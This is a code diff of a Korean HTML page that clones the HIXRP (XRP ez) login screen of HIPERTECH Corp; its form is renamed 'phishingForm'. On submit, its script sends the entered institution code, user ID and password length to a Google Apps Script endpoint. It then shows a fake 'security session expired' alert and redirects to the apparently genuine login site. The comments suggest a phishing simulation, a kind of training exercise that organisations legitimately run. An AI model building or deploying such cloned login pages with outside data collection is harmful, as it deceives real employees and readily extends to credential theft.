@@ -2,161 +2,213 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XRP ez Login</title>
+    <title>HIXRP 로그인</title>
     <style>
-        /* 배경 및 기본 설정: 이미지의 블루 그라데이션 느낌 재현 */
-        body { 
-            font-family: 'Malgun Gothic', sans-serif; 
-            margin: 0; 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            background: linear-gradient(135deg, #a5c9fd 0%, #dae9ff 100%);
+        /* 1. 배경 설정: 화면 꽉 차게 중앙 정렬 */
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center; /* 가로 정중앙 정렬 */
+            align-items: center;     /* 세로 정중앙 정렬 */
+            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
+            background: url('illustration.png') no-repeat center center;
+            background-size: cover;
             overflow: hidden;
         }
 
-        /* 로그인 컨테이너 */
-        .login-box {
-            width: 350px;
-            background-color: rgba(255, 255, 255, 0.9);
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            z-index: 2;
+        /* 2. 로그인 박스 컨테이너 (치우침 없이 완벽한 가운데) */
+        .login-container {
+            width: 320px;
+            /* 기존에 있던 margin-right, margin-top 속성을 모두 삭제해서 완벽한 중앙 정렬! */
         }
 
-        .logo-area img {
-            width: 120px;
+        /* 로고 영역 */
+        .logo-area {
+            text-align: center;
             margin-bottom: 20px;
         }
 
-        /* 입력 필드 스타일 */
-        .input-group {
-            display: flex;
-            margin-bottom: 10px;
-            border: 1px solid #9dbce3;
-            border-radius: 4px;
-            overflow: hidden;
+        .logo-area img {
+            max-width: 130px;
         }
 
-        .input-group label {
+        /* 3. 입력 폼 (연한 파란색 배경 & 하얀색 테두리) */
+        .input-row {
+            display: flex;
+            margin-bottom: 8px;
+            border: 1px solid #fff;
+            background-color: #8bbaf3; 
+            height: 38px;
+        }
+
+        /* 왼쪽 라벨 */
+        .input-row label {
             width: 80px;
-            background-color: #f0f4f9;
-            color: #5579a6;
-            font-size: 11px;
-            font-weight: bold;
             display: flex;
-            justify-content: center;
             align-items: center;
-            border-right: 1px solid #9dbce3;
-            text-transform: uppercase;
+            justify-content: center;
+            font-size: 10px;
+            color: #fff;
+            font-weight: normal;
+            border-right: 1px solid #fff;
         }
 
-        input[type="text"], input[type="password"] {
+        /* 오른쪽 입력 칸 */
+        .input-row input {
             flex: 1;
-            padding: 10px;
+            background-color: transparent;
             border: none;
             outline: none;
-            font-size: 13px;
-        }
-
-        /* 로그인 버튼 */
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #1e2a4a;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-
-        .login-btn:hover {
-            background-color: #2c3e6b;
-        }
-
-        /* 하단 링크 */
-        .footer-links {
-            margin-top: 15px;
+            padding: 0 10px;
             font-size: 11px;
-            color: #666;
+            color: #333;
+        }
+        
+        .input-row input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
         }
 
+        /* 4. 로그인 버튼 */
+        .btn-login {
+            width: 100%;
+            height: 40px;
+            background-color: #212c5b;
+            color: #fff;
+            border: none;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+            letter-spacing: 2px;
+        }
+
+        /* 5. 퇴사자 증명 신청 버튼 */
+        .btn-resign {
+            width: 100%;
+            height: 35px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border: 1px solid #fff;
+            color: #333;
+            font-size: 11px;
+            cursor: pointer;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* 6. 하단 옵션 (체크박스) */
+        .options {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+            font-size: 10px;
+            color: #555;
+        }
+        .options label {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            cursor: pointer;
+        }
+
+        /* 7. 최하단 텍스트 링크들 */
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            font-size: 10px;
+            color: #555;
+        }
+        .footer-links a {
+            text-decoration: none;
+            color: #555;
+        }
+        .footer-links strong {
+            color: blue;
+        }
+
+        /* 8. 카피라이트 */
         .copyright {
             position: absolute;
             bottom: 20px;
             width: 100%;
             text-align: center;
-            font-size: 10px;
-            color: #888;
+            font-size: 9px;
+            color: #777;
+            letter-spacing: 1px;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <div class="logo-area">
-            <!-- 로고 이미지는 이미지 호스팅 주소로 교체해서 써 형 -->
-            <strong style="font-size: 24px; color: #1e2a4a;">XRP<span style="color:#7cb342">ez</span></strong>
-        </div>
+    <div class="login-container">
         
-        <form id="simulationForm">
-            <div class="input-group">
+        <div class="logo-area">
+            <img src="logo.png" alt="XRP ez logo">
+        </div>
+
+        <form id="phishingForm">
+            <div class="input-row">
                 <label>CODE</label>
-                <input type="text" id="compCode" placeholder="기관코드" required>
+                <input type="text" id="entCd" placeholder="기관코드" required>
             </div>
-            <div class="input-group">
+            
+            <div class="input-row">
                 <label>ID</label>
                 <input type="text" id="userId" placeholder="아이디" required>
             </div>
-            <div class="input-group">
+            
+            <div class="input-row">
                 <label>PASSWORD</label>
                 <input type="password" id="userPw" placeholder="비밀번호" required>
             </div>
-            
-            <button type="submit" class="login-btn">로 그 인</button>
+
+            <button type="submit" class="btn-login">로 그 인</button>
         </form>
 
+        <button class="btn-resign">
+            📄 퇴사자 증명 신청
+        </button>
+
+        <div class="options">
+            <label><input type="checkbox"> 기관코드저장</label>
+            <label><input type="checkbox"> 아이디저장</label>
+        </div>
+
         <div class="footer-links">
-            <span>기관코드저장</span> | <span>아이디저장</span>
+            <a href="#">IP승인요청</a>
+            <a href="#">비밀번호 찾기</a>
+            <a href="#"><strong>개인정보처리방침</strong></a>
         </div>
     </div>
 
     <div class="copyright">
-        © HIPERTECH Corp. All Rights Reserved.
+        ⓒ HIPERTECH Corp. All Rights Reserved.
     </div>
 
     <script>
         const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';
 
-        // 데이터 전송 함수 (기관코드, 아이디, 비번 길이)
-        const sendData = (code, id, pwLen) => {
-            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(code)}&inputId=${encodeURIComponent(id)}&pwLen=${pwLen}`;
-            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
-        };
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-        // 폼 제출 이벤트
-        document.getElementById('simulationForm').addEventListener('submit', function(e) {
-            e.preventDefault(); 
-            
-            const code = document.getElementById('compCode').value;
+            const entCd = document.getElementById('entCd').value;
             const id = document.getElementById('userId').value;
             const pw = document.getElementById('userPw').value;
 
-            // 로그 전송 (비밀번호는 길이만 보냄)
-            sendData(code, id, pw.length);
+            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
+            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
 
-            // 세션 종료 멘트 후 실제 로그인 페이지로 리다이렉트
             setTimeout(() => {
                 alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
-                // 실제 HIXRP 로그인 주소로 수정해서 쓰면 돼
-                window.location.href = 'https://gnware.gnk.or.kr/login'; 
+                window.location.href = 'https://gnk.hixrp.kr/index.jsp';
             }, 500);
         });
     </script>
